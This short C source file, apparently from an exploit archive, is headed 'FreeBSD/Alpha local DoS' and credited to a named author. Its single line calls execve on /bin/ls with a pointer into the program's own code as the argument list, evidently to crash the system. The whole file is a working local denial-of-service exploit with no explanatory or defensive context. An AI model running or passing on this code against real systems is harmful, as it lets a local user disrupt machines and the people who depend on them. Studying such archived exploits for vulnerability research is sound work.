/*
 * FreeBSD/Alpha local DoS
 *    by Marceta Milos
 *    root@marcetam.net
 *
 */

char main() { execve("/bin/ls",(int *)(main + 1), 0); }
